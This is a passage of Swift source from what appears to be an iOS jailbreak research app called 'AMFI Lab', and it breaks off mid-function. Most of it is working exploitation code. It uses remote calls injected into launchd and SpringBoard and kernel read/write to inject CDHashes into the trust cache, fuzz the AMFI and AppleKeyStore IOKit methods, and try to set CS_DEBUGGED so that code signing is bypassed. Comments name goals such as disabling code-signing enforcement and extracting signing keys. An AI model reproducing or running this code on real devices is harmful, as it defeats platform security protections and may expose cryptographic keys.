                        .padding(.vertical, 2)
                    }
                } header: {
                    HStack {
                        Label("Results (\(results.count))", systemImage: "list.bullet")
                        Spacer()
                        if !results.isEmpty {
                            Button("Clear") { results.removeAll() }
                                .font(.caption2)
                        }
                    }
                }
            } else if !isRunning {
                Section {
                    Text("No results yet. Tap 'Run All' to start.")
                        .font(.caption)
                        .foregroundStyle(.secondary)
                } header: {
                    Label("Results", systemImage: "list.bullet")
                }
            }
        }
        .navigationTitle("AMFI Lab")
        .navigationBarTitleDisplayMode(.inline)
    }

    @ViewBuilder
    private func pathButton(
        title: String,
        icon: String,
        color: Color,
        label: String,
        action: @escaping () -> Void,
        needsVerified: Bool,
        needsProbe: Bool = false
    ) -> some View {
        Button(action: action) {
            HStack {
                Label(title, systemImage: icon)
                    .foregroundStyle(isRunning ? .gray : color)
                Spacer()
                if isRunning && runningLabel.contains(label) {
                    ProgressView().scaleEffect(0.7)
                }
            }
        }
        .disabled(
            isRunning || !mgr.dsready
                || (needsVerified && !PhysmapConstants.isVerified)
                || (needsProbe && !PhysmapConstants.isProbeOK)
        )
    }

    // MARK: - Jailbreak path runners

    private func runExperiment(
        label: String,
        operation: String,
        append: Bool = false,
        block: @escaping (RemoteCall) -> ExperimentResult
    ) {
        isRunning = true
        runningLabel = label

        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: operation) { rc in
            let result = block(rc)
            DispatchQueue.main.async {
                if append {
                    self.results.insert(result, at: 0)
                } else {
                    self.results = [result]
                }
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    /// Exp 74 is KRW-only — must NOT hold launchd (IOSurface + long KRW = initproc panic).
    private func runExp74() {
        isRunning = true
        runningLabel = "Physmap"
        guard mgr.dsready else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expPhysmapAccess()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    /// Probe = KRW-only (no launchd). sysctl/RC was causing 3+ min hangs with no UI update.
    private func runExp77Probe() {
        isRunning = true
        runningLabel = "TC Probe"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expTrustCacheProbeSafe()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    /// Inject = KRW-only (no launchd). Validates physmap VA before any write.
    private func runExp77Inject() {
        isRunning = true
        runningLabel = "TC Inject"
        guard mgr.dsready, PhysmapConstants.isVerified, PhysmapConstants.isProbeOK else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expTrustCacheWrite(rc: nil, dryRun: false)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    /// Exp 80: RC Trust Cache Add via launchd RemoteCall.
    /// Ini jalur PPL-safe: panggil trust_cache_runtime_add dari launchd context.
    /// PPL yang melakukan write internal — tidak ada KTRR fault.
    private func runExp80RCTrustCacheAdd() {
        isRunning = true
        runningLabel = "RC TC Add"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp80_rc_tc_add") { rc in
            let result = self.expRCTrustCacheAdd(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    private func runExp81HeapTCAnalysis() {
        isRunning = true
        runningLabel = "Heap TC"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expHeapTCAnalysis()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }
    private func runExp78() {
        runExperiment(label: "DART", operation: "exp78_dart", append: true) { rc in
            self.expDARTPTEProbe(rc: rc)
        }
    }

    /// Exp 79 Tahap 1: Write test — tulis sentinel ke slot kosong, verify, restore.
    /// Tidak memodifikasi entry yang ada. Aman untuk dijalankan.
    private func runExp79WriteTest() {
        isRunning = true
        runningLabel = "Write Test"
        guard mgr.dsready, PhysmapConstants.isVerified, PhysmapConstants.isProbeOK else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expWriteTest()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    /// Exp 79 Tahap 2: CDHash inject — hanya jika write test sukses.
    private func runExp79Inject() {
        isRunning = true
        runningLabel = "TC Inject"
        guard mgr.dsready, PhysmapConstants.isVerified, PhysmapConstants.isProbeOK else {
            isRunning = false
            runningLabel = ""
            return
        }
        guard probedTCAddr != 0 else {
            results.insert(ExperimentResult(
                name: "TC Inject (Exp 79)",
                success: false,
                detail: "❌ Jalankan Write Test dulu — tc_addr belum diset.\nProbe ulang Exp 77 jika perlu.",
                timestamp: Date()
            ), at: 0)
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expInjectCDHash()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }
    
    private func testSingleBinary(_ path: String) {
        isRunning = true
        runningLabel = "Testing \(path)..."
        
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "test_binary") { rc in
            let result = self.expPosixSpawn(rc: rc, binary: path, name: "posix_spawn \(path)")
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail, 0)
        }
        #endif
    }
    
    private func runAmfidRC() {
        isRunning = true
        runningLabel = "amfid RC (may take 10s)..."
        
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "amfid_rc") { rc in
            let result = self.expRCIntoAmfid(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail, 0)
        }
        #endif
    }
    
    // MARK: - Experiment Implementations
    
    #if !DISABLE_REMOTECALL
    /// Helper: posix_spawn a binary
    private func expPosixSpawn(rc: RemoteCall, binary: String, name: String) -> ExperimentResult {
        let mem = rc.trojanMem
        let binAddr = remote_alloc_str(rc, binary)
        
        // argv = [binary, NULL]
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)
        
        // pid output
        let pidAddr = mem + 0x300
        rc[pidAddr].setValue32(0)
        
        // posix_spawn(&pid, binary, NULL, NULL, argv, NULL)
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
        let pid = rc[pidAddr].value32()
        
        // If spawned, wait for it
        if ret == 0 && pid != 0 {
            let statusAddr = mem + 0x380
            rc[statusAddr].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
            let exitStatus = rc[statusAddr].value32()
            
            RootExecutor.rcall(rc, "free", binAddr)
            return ExperimentResult(
                name: name,
                success: true,
                detail: "âœ… PID=\(pid), exit=\(exitStatus >> 8), ret=\(ret)",
                timestamp: Date()
            )
        }
        
        // Failed â€” get errno
        let err = remote_errno(rc)
        RootExecutor.rcall(rc, "free", binAddr)
        return ExperimentResult(
            name: name,
            success: false,
            detail: "âŒ ret=\(ret), errno=\(err), pid=\(pid)",
            timestamp: Date()
        )
    }
    
    // MARK: - Experiment 54: IOKit Driver Probe
    
    /// IOKit driver probe â€” find accessible user clients for potential exploitation
    /// Some IOKit drivers have bugs in external methods (OOB read/write)
    private func expIOKitProbe(rc: RemoteCall) -> ExperimentResult {
        var detail = "IOKit Driver Probe â€” finding accessible user clients\n\n"
        
        // From SpringBoard (has more IOKit access than launchd)
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "IOKit probe", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        // Try to open various IOKit user clients
        let services = [
            "IOSurfaceRoot",
            "AGXAccelerator",
            "AppleAVD",
            "AppleH13CamIn",
            "IOHIDSystem",
            "AppleSPU",
            "AppleKeyStore",
            "AppleCredentialManager",
            "IOAudioEngine",
            "AppleMobileFileIntegrity",
        ]
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let ioServiceMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let ioServiceGetMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceGetMatchingService"))
        let ioServiceOpen = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceOpen"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceClose"))
        
        guard ioServiceMatching != 0 && ioServiceGetMatching != 0 && ioServiceOpen != 0 else {
            detail += "IOKit functions not available\n"
            // Try loading IOKit
            let fwPath = remote_alloc_str(sb, "/System/Library/Frameworks/IOKit.framework/IOKit")
            RootExecutor.rcall(sb, "dlopen", fwPath, 1)
            RootExecutor.rcall(sb, "free", fwPath)
            detail += "Tried loading IOKit framework\n"
            return ExperimentResult(name: "IOKit probe", success: false, detail: detail, timestamp: Date())
        }
        
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        let mem = sb.trojanMem
        
        for service in services {
            let nameAddr = remote_alloc_str(sb, service)
            let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
            
            if matchDict != 0 {
                let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
                if svc != 0 {
                    // Try to open with type 0
                    let connectAddr = mem + 0x1A00
                    sb[connectAddr].setValue32(0)
                    let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
                    let connect = sb[connectAddr].value32()
                    
                    if openRet == 0 && connect != 0 {
                        detail += "âœ… \(service): OPENED! connect=\(connect)\n"
                        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
                    } else {
                        detail += "  \(service): found but open failed (ret=0x\(String(format: "%x", openRet)))\n"
                    }
                } else {
                    detail += "  \(service): not found\n"
                }
            }
            RootExecutor.rcall(sb, "free", nameAddr)
        }
        
        let hasOpen = detail.contains("âœ…")
        if hasOpen {
            detail += "\nâœ… Accessible user clients found!\n"
            detail += "These can be fuzzed for OOB read/write vulnerabilities.\n"
            detail += "External methods might give us access to different kernel zones!\n"
        }
        
        return ExperimentResult(name: "IOKit probe", success: hasOpen, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 55: CoreTrust Certificate Probe
    
    /// CoreTrust certificate probe â€” test what signatures iOS 18.2 accepts
    /// Try spawning binary with different signature types
    private func expCoreTrustProbe(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        var detail = "CoreTrust Certificate Probe\n\n"
        
        // CoreTrust validates the certificate chain in code signatures.
        // We can't easily CREATE certificates from device, but we can:
        // 1. Check what signature our app has (it's signed!)
        // 2. Check what signature system binaries have
        // 3. Try to copy signature from signed binary to unsigned one
        
        // Step 1: Read our app's code signature info
        let pid = RootExecutor.rcall(rc, "getpid")
        detail += "Our PID: \(pid)\n"
        
        // csops(pid, CS_OPS_STATUS, &status, sizeof(status))
        // CS_OPS_STATUS = 0
        let statusAddr = mem + 0x1A00
        rc[statusAddr].setValue32(0)
        let csopsRet = RootExecutor.rcall(rc, "csops", pid, 0, statusAddr, 4)
        let csStatus = rc[statusAddr].value32()
        detail += "csops(STATUS): ret=\(csopsRet), flags=0x\(String(format: "%x", csStatus))\n"
        
        // Decode flags
        if csStatus & 0x1 != 0 { detail += "  CS_VALID\n" }
        if csStatus & 0x4 != 0 { detail += "  CS_HARD\n" }
        if csStatus & 0x8 != 0 { detail += "  CS_KILL\n" }
        if csStatus & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY\n" }
        if csStatus & 0x200 != 0 { detail += "  CS_PLATFORM_PATH\n" }
        if csStatus & 0x800 != 0 { detail += "  CS_DEBUGGED\n" }
        if csStatus & 0x4000 != 0 { detail += "  CS_GET_TASK_ALLOW\n" }
        if csStatus & 0x20000 != 0 { detail += "  CS_INSTALLER\n" }
        
        // Step 2: Try csops on launchd (PID 1)
        rc[statusAddr].setValue32(0)
        let csops1 = RootExecutor.rcall(rc, "csops", 1, 0, statusAddr, 4)
        let cs1Status = rc[statusAddr].value32()
        detail += "\nlaunchd csops: ret=\(csops1), flags=0x\(String(format: "%x", cs1Status))\n"
        if cs1Status & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY âœ…\n" }
        
        // Step 3: Check if we can set CS_DEBUGGED on ourselves via csops
        // CS_OPS_SET_STATUS = 8 (might be restricted)
        detail += "\nTrying to set CS_DEBUGGED on our process...\n"
        let newFlags: UInt32 = csStatus | 0x800 // add CS_DEBUGGED
        rc[statusAddr].setValue32(newFlags)
        let setRet = RootExecutor.rcall(rc, "csops", pid, 8, statusAddr, 4)
        detail += "csops(SET_STATUS, +CS_DEBUGGED): ret=\(setRet)\n"
        
        // Read back
        rc[statusAddr].setValue32(0)
        RootExecutor.rcall(rc, "csops", pid, 0, statusAddr, 4)
        let afterFlags = rc[statusAddr].value32()
        detail += "After set: flags=0x\(String(format: "%x", afterFlags))\n"
        
        if afterFlags & 0x800 != 0 && csStatus & 0x800 == 0 {
            detail += "\nâœ…âœ…âœ… CS_DEBUGGED SET SUCCESSFULLY! âœ…âœ…âœ…\n"
            detail += "This might allow loading unsigned code in our process!\n"
            detail += "CS_DEBUGGED disables some AMFI checks!\n"
        }
        
        // Step 4: Try CS_OPS_MARKKILL = 6 (mark as killable â€” might affect enforcement)
        // And CS_OPS_CLEARPLATFORM = 13
        detail += "\nOther csops experiments:\n"
        let csopsTests: [(String, UInt64)] = [
            ("CS_OPS_MARKHARD (4)", 4),
            ("CS_OPS_MARKKILL (6)", 6),
            ("CS_OPS_CLEARPLATFORM (13)", 13),
            ("CS_OPS_CLEARINSTALLER (14)", 14),
        ]
        
        for (name, op) in csopsTests {
            rc[statusAddr].setValue32(0)
            let r = RootExecutor.rcall(rc, "csops", pid, op, statusAddr, 4)
            detail += "  \(name): ret=\(r)\n"
        }
        
        let success = detail.contains("âœ…âœ…âœ…")
        return ExperimentResult(name: "CoreTrust/csops probe", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 56: AMFI External Method Fuzzing
    
    /// Experiment 56: Open AMFI user client and fuzz ALL external methods!
    /// AppleMobileFileIntegrity kext has external methods that might:
    /// - Whitelist a binary hash
    /// - Disable enforcement for a process
    /// - Add an exception to code signing policy
    /// - Return internal state we can use
    private func expAMFIExternalMethods() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ AMFI methods", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        var detail = "AMFI External Method Fuzzing\n"
        detail += "Opening AppleMobileFileIntegrity user client...\n\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Get IOKit function pointers (resolved for availability check)
        let ioServiceMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceGetMatchingService"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceOpen"))
        // IOConnectCallScalarMethod(connect, selector, input, inputCnt, output, outputCnt) â€” 6 params
        let ioConnectCallScalar = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOConnectCallScalarMethod"))
        
        guard ioServiceMatching != 0 && ioConnectCallScalar != 0 else {
            detail += "IOKit functions not available\n"
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ AMFI methods", success: false, detail: detail, timestamp: Date())
        }
        
        // Open AMFI user client
        let nameAddr = remote_alloc_str(sb, "AppleMobileFileIntegrity")
        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
        let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
        
        guard svc != 0 else {
            detail += "AMFI service not found\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ AMFI methods", success: false, detail: detail, timestamp: Date())
        }
        
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        let connectAddr = mem + 0x1A00
        sb[connectAddr].setValue32(0)
        let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
        let connect = sb[connectAddr].value32()
        
        guard openRet == 0 && connect != 0 else {
            detail += "Failed to open AMFI: ret=0x\(String(format: "%x", openRet))\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ AMFI methods", success: false, detail: detail, timestamp: Date())
        }
        
        detail += "âœ… AMFI user client opened! connect=\(connect)\n\n"
        detail += "Fuzzing external methods (selectors 0-15)...\n\n"
        
        // IOConnectCallScalarMethod(connect, selector, input, inputCnt, output, outputCnt)
        // Only 6 params â€” safe for ARM64 register calling convention
        
        // Setup output buffer (space for 16 uint64 outputs)
        let scalarOutAddr = mem + 0x1C00
        let scalarOutCntAddr = mem + 0x1D00
        // Input area
        let scalarInAddr = mem + 0x2000
        
        var foundMethods: [Int] = []
        
        for selector in 0..<16 {
            // Reset output count
            sb[scalarOutCntAddr].setValue32(16)
            
            // Clear output
            for i in 0..<16 {
                sb[scalarOutAddr + UInt64(i * 8)].setValue64(0)
            }
            
            // IOConnectCallScalarMethod(connect, selector, NULL, 0, output, &outputCnt)
            let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                         UInt64(connect),
                                         UInt64(selector),
                                         0, 0,  // no input
                                         scalarOutAddr, scalarOutCntAddr)
            
            let outCnt = sb[scalarOutCntAddr].value32()
            
            // Interpret return value
            // 0 = success, 0xe00002bc = invalid selector, 0xe00002c2 = bad argument
            let retHex = String(format: "0x%x", ret)
            
            if ret == 0 {
                detail += "âœ… Selector \(selector): SUCCESS! outCnt=\(outCnt)\n"
                foundMethods.append(selector)
                
                // Read scalar outputs
                if outCnt > 0 {
                    detail += "   Scalar outputs: "
                    for i in 0..<min(Int(outCnt), 4) {
                        let val = sb[scalarOutAddr + UInt64(i * 8)].value64()
                        detail += "[\(i)]=0x\(String(format: "%llx", val)) "
                    }
                    detail += "\n"
                }
            } else if ret == 0xe00002bc {
                // kIOReturnBadArgument â€” selector doesn't exist
                detail += "   Selector \(selector): not implemented (0xe00002bc)\n"
            } else if ret == 0xe00002c2 {
                // kIOReturnUnsupported or bad input count
                detail += "âš ï¸ Selector \(selector): needs input! (ret=\(retHex))\n"
                foundMethods.append(selector)
            } else if ret == 0xe0000001 {
                detail += "âš ï¸ Selector \(selector): general error (ret=\(retHex))\n"
                foundMethods.append(selector)
            } else {
                detail += "   Selector \(selector): ret=\(retHex)\n"
                if ret != 0xe00002bc && ret != 0xe00002c7 {
                    foundMethods.append(selector)  // non-standard error = method exists
                }
            }
        }
        
        // Now try selectors with scalar input (1 uint64 = 0)
        if !foundMethods.isEmpty {
            detail += "\n--- Re-testing found methods with input ---\n"
            for selector in foundMethods.prefix(8) {
                // Try with 1 scalar input = 0
                sb[scalarInAddr].setValue64(0)
                sb[scalarOutCntAddr].setValue32(16)
                
                let ret2 = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                             UInt64(connect),
                                             UInt64(selector),
                                             scalarInAddr, 1,  // 1 scalar input
                                             scalarOutAddr, scalarOutCntAddr)
                
                let outCnt2 = sb[scalarOutCntAddr].value32()
                detail += "  Selector \(selector) + input(0): ret=0x\(String(format: "%x", ret2)), outCnt=\(outCnt2)\n"
                
                if ret2 == 0 && outCnt2 > 0 {
                    let val = sb[scalarOutAddr].value64()
                    detail += "    â†’ output[0] = 0x\(String(format: "%llx", val))\n"
                }
            }
        }
        
        // Close
        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
        RootExecutor.rcall(sb, "free", nameAddr)
        
        detail += "\n--- Summary ---\n"
        detail += "Found \(foundMethods.count) active methods: \(foundMethods)\n"
        if !foundMethods.isEmpty {
            detail += "NEXT: Try specific inputs to these methods\n"
            detail += "Goal: find method that disables CS enforcement or whitelists hash\n"
        }
        
        let success = !foundMethods.isEmpty
        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ AMFI methods", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 57: AppleKeyStore Probe
    
    /// Experiment 57: AppleKeyStore external method probe
    /// KeyStore manages encryption keys â€” if we can extract/manipulate keys
    /// we might be able to sign our own binaries or decrypt protected data
    private func expKeyStoreProbe() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ KeyStore probe", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        var detail = "AppleKeyStore External Method Probe\n\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let ioServiceMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceGetMatchingService"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceOpen"))
        let ioConnectCallScalar = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOConnectCallScalarMethod"))
        
        guard ioServiceMatching != 0 && ioConnectCallScalar != 0 else {
            detail += "IOKit functions not available in SpringBoard\n"
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ KeyStore probe", success: false, detail: detail, timestamp: Date())
        }
        
        // Open AppleKeyStore
        let nameAddr = remote_alloc_str(sb, "AppleKeyStore")
        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
        let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
        
        guard svc != 0 else {
            detail += "AppleKeyStore service not found\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ KeyStore probe", success: false, detail: detail, timestamp: Date())
        }
        
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        let connectAddr = mem + 0x1A00
        sb[connectAddr].setValue32(0)
        let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
        let connect = sb[connectAddr].value32()
        
        guard openRet == 0 && connect != 0 else {
            detail += "Failed to open KeyStore: ret=0x\(String(format: "%x", openRet))\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ KeyStore probe", success: false, detail: detail, timestamp: Date())
        }
        
        detail += "âœ… AppleKeyStore opened! connect=\(connect)\n\n"
        
        // Fuzz selectors 0-20 (KeyStore has many methods)
        let scalarOutAddr = mem + 0x1C00
        let scalarOutCntAddr = mem + 0x1D00
        
        var foundMethods: [Int] = []
        
        for selector in 0..<20 {
            sb[scalarOutCntAddr].setValue32(16)
            
            // IOConnectCallScalarMethod(connect, selector, NULL, 0, output, &outputCnt)
            let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                         UInt64(connect),
                                         UInt64(selector),
                                         0, 0,
                                         scalarOutAddr, scalarOutCntAddr)
            
            if ret == 0 {
                let outCnt = sb[scalarOutCntAddr].value32()
                detail += "âœ… Selector \(selector): SUCCESS! out=\(outCnt)\n"
                foundMethods.append(selector)
                if outCnt > 0 {
                    let val = sb[scalarOutAddr].value64()
                    detail += "   output[0] = 0x\(String(format: "%llx", val))\n"
                }
            } else if ret != 0xe00002bc && ret != 0xe00002c7 {
                detail += "âš ï¸ Selector \(selector): ret=0x\(String(format: "%x", ret)) (exists but needs input)\n"
                foundMethods.append(selector)
            }
        }
        
        // Close
        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
        RootExecutor.rcall(sb, "free", nameAddr)
        
        detail += "\nFound \(foundMethods.count) active KeyStore methods: \(foundMethods)\n"
        detail += "KeyStore methods can potentially:\n"
        detail += "- Extract signing keys\n"
        detail += "- Create new key bags\n"
        detail += "- Manipulate trust anchors\n"
        
        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ KeyStore probe", success: !foundMethods.isEmpty, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 58: AMFI Struct Method Deep Probe
    
    /// Experiment 58: AMFI methods need struct input â€” probe with various struct formats
    /// Known AMFI IOKit methods typically accept:
    /// - CDHash (20 bytes SHA1 or 32 bytes SHA256) for binary whitelisting
    /// - PID (4 bytes) for process-specific operations
    /// - Entitlement queries (string + PID)
    /// - Trust cache entries (CDHash + flags)
    ///
    /// We try different struct sizes and content to find what each selector expects
    private func expAMFIStructProbe() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI struct", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        var detail = "AMFI Struct Method Deep Probe\n\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let ioConnectCallStruct = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOConnectCallStructMethod"))
        
        guard ioConnectCallStruct != 0 else {
            detail += "IOConnectCallStructMethod not available\n"
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI struct", success: false, detail: detail, timestamp: Date())
        }
        
        // Re-open AMFI user client
        let nameAddr = remote_alloc_str(sb, "AppleMobileFileIntegrity")
        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
        let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
        
        guard svc != 0 else {
            detail += "AMFI service not found\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI struct", success: false, detail: detail, timestamp: Date())
        }
        
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        let connectAddr = mem + 0x1A00
        sb[connectAddr].setValue32(0)
        let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
        let connect = sb[connectAddr].value32()
        
        guard openRet == 0 && connect != 0 else {
            detail += "Failed to open AMFI: ret=0x\(String(format: "%x", openRet))\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI struct", success: false, detail: detail, timestamp: Date())
        }
        
        detail += "âœ… AMFI opened: connect=\(connect)\n\n"
        
        // IOConnectCallStructMethod(connect, selector, inputStruct, inputSize, outputStruct, &outputSize)
        // 6 params â€” safe for ARM64
        
        let structInAddr = mem + 0x2200   // input struct buffer (256 bytes)
        let structOutAddr = mem + 0x2400  // output struct buffer (256 bytes)
        let structOutSizeAddr = mem + 0x2600
        
        // Active selectors from exp 56: [2, 4, 5, 6, 7, 9, 11, 12, 13, 14, 15]
        // Test selector 2 first (likely the most basic method)
        
        var foundWorking: [(Int, String)] = []
        
        // Strategy 1: Try each active selector with different struct sizes
        // AMFI methods typically expect specific struct sizes
        let testSelectors = [2, 4, 5, 9, 11, 12]  // subset to avoid panic
        let testSizes: [UInt64] = [4, 8, 20, 24, 32, 40, 48, 64]
        
        detail += "--- Testing struct input sizes ---\n"
        
        for selector in testSelectors.prefix(4) {  // limit to 4 selectors
            detail += "\nSelector \(selector):\n"
            
            for size in testSizes {
                // Zero-fill input struct
                for i in 0..<Int(size / 8 + 1) {
                    sb[structInAddr + UInt64(i * 8)].setValue64(0)
                }
                
                // Set output size
                sb[structOutSizeAddr].setValue64(256)
                
                // Clear output
                for i in 0..<32 {
                    sb[structOutAddr + UInt64(i * 8)].setValue64(0)
                }
                
                // IOConnectCallStructMethod(connect, selector, input, inputSize, output, &outputSize)
                let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                             UInt64(connect),
                                             UInt64(selector),
                                             structInAddr, size,
                                             structOutAddr, structOutSizeAddr)
                
                let outSize = sb[structOutSizeAddr].value64()
                
                if ret == 0 {
                    detail += "  âœ… size=\(size): SUCCESS! outSize=\(outSize)\n"
                    foundWorking.append((selector, "struct_size=\(size)"))
                    
                    // Read output
                    if outSize > 0 && outSize <= 64 {
                        var outBuf = [UInt8](repeating: 0, count: Int(outSize))
                        sb.remoteRead(structOutAddr, to: &outBuf, size: outSize)
                        let hex = outBuf.prefix(24).map { String(format: "%02x", $0) }.joined(separator: " ")
                        detail += "    output: \(hex)\n"
                    }
                    break  // found working size for this selector
                } else if ret != 0xe00002c2 && ret != 0xe00002c7 && ret != 0xe00002bc {
                    // Different error â€” interesting!
